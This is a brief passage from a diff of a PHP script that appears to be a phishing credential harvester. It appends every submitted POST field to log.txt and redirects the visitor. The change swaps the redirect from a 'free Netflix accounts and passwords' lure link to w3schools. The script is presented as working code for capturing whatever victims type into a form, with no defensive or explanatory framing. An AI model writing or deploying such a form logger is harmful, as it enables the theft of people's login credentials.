@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://snurl.com/free-netflix-accounts-and-passwords/');
+header ('Location:www.w3schools.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value){
    fwrite($handle, $variable);
